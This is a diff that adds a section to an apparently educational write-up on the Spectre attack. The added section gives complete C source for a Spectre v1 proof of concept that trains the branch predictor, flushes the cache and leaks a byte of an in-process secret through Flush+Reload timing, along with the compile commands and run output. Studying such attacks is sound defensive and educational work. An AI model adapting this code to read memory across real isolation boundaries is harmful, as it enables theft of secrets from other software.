@@ -416,6 +416,145 @@ $ ./specexec
 
 ## The Spectre Attack
 
+Consider the case of an attacker trying to steal data from the same process using traces of the out-of-order execution left behind by the CPU.
+
+In the following program, assume the attacker already knows the address of the secret.
+```c
+/* SpectreAttack.c */
+#include <x86intrin.h>
+#include <stdio.h>
+
+#define CACHE_HIT_THRESHOLD (80)
+#define DELTA 1024
+
+unsigned int buffer_size = 10;
+uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
+uint8_t array[256 * 4096];
+uint8_t temp = 0;
+char *secret = "St. Louis County recorded a total of 4,159 violent crimes in 2021!";
+
+/* Sandbox Function */
+uint8_t restrictedAccess(size_t x)
+{
+    if (x < buffer_size) {
+        return buffer[x];
+    } else {
+        return 0;
+    }
+}
+
+void flushSideChannel()
+{
+    int i;
+
+    /* Write to array to bring it to RAM to prevent COW */
+    for (i = 0; i < 256; i++) {
+        array[i * 4096 + DELTA] = 1;
+    }
+    /* Flush the values of the array from cache */
+    for (i = 0; i < 256; i++) {
+       _mm_clflush(&array[i * 4096 + DELTA]);
+    }
+}
+
+void reloadSideChannel()
+{
+    unsigned int junk = 0;
+    register uint64_t time1, time2;
+    volatile uint8_t *addr;
+    int i;
+    for (i = 0; i < 256; i++) {
+        addr = &array[i * 4096 + DELTA];
+        time1 = __rdtscp(&junk);
+        junk = *addr;
+        time2 = __rdtscp(&junk) - time1;
+        if (time2 <= CACHE_HIT_THRESHOLD) {
+            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
+            printf("The secret is %d.\n", i);
+        }
+    }
+}
+
+void spectreAttack(size_t larger_x)
+{
+    int i;
+    uint8_t s;
+
+    /* Train the CPU to take the true branch inside sandbox function */
+    for (i = 0; i < 10; i++) {
+        restrictedAccess(i);
+    }
+
+    /* Flush buffer_size and array[] from the cache */
+    _mm_clflush(&buffer_size); /* Required for the attack to take effect */
+    for (i = 0; i < 256; i++) {
+        _mm_clflush(&array[i * 4096 + DELTA]);
+    }
+    for (i = 0; i < 100; i++) { }
+
+    s = restrictedAccess(larger_x); /* Only zero should be returned */
+    array[s * 4096 + DELTA] += 88;  /* However the cache is not cleaned */
+}
+
+int main()
+{
+    flushSideChannel();
+
+    size_t larger_x = (size_t)(secret - (char *)buffer);    /* Offset of the secret from the beginning of the buffer */
+    spectreAttack(larger_x);
+    
+    reloadSideChannel();
+
+    return 0;
+}
+```
+
+Since we are racing against the execution unit that is comparing our input to the buffer size, we flush the <code>buffer_size</code> variable from the cache so that the comparation takes longer. Compile the program and run it multiple times:
+```console
+$ gcc -march=native SpectreAttack.c -o SpectreAttack
+$ ./SpectreAttack
+array[0 * 4096 + 1024] is in cache!
+The secret is 0.
+array[83 * 4096 + 1024] is in cache!
+The secret is 83.
+$ ./SpectreAttack
+array[0 * 4096 + 1024] is in cache!
+The secret is 0.
+$ ./SpectreAttack
+array[0 * 4096 + 1024] is in cache!
+The secret is 0.
+$ ./SpectreAttack
+array[0 * 4096 + 1024] is in cache!
+The secret is 0.
+array[83 * 4096 + 1024] is in cache!
+The secret is 83.
+$ ./SpectreAttack
+array[0 * 4096 + 1024] is in cache!
+The secret is 0.
+array[83 * 4096 + 1024] is in cache!
+The secret is 83.
+```
+
+It is shown that the element <code>array[0 * 4096 + 1024]</code> is always in the cache because we bring it into the cache and modify its value inside our attack function. Another secret, $83$, which is the ASCII value of letter <code>S</code>, the first letter of our secret string, gets printed out because of CPU's speculative execution and the ability of out-of-bound array access in C. Then, I commented out the idle loop after flushing and obtained the following results on my mac:
+```console
+$ gcc -march=native SpectreAttack.c -o SpectreAttack
+$ ./SpectreAttack
+$ ./SpectreAttack
+$ ./SpectreAttack
+array[0 * 4096 + 1024] is in cache!
+The secret is 0.
+$ ./SpectreAttack
+array[83 * 4096 + 1024] is in cache!
+The secret is 83.
+$ ./SpectreAttack
+array[83 * 4096 + 1024] is in cache!
+The secret is 83.
+$ ./SpectreAttack
+array[83 * 4096 + 1024] is in cache!
+The secret is 83.
+```
+In most cases, the secret <code>0</code> was not printed, probably because the element was brought into the cache before our cache flushing took place.
+
 ## References
 
 [^1]: Colin Percival, "Cache Missing for Fun and Profit," In *BSDCan 2005*, Ottawa, CA, 2005.
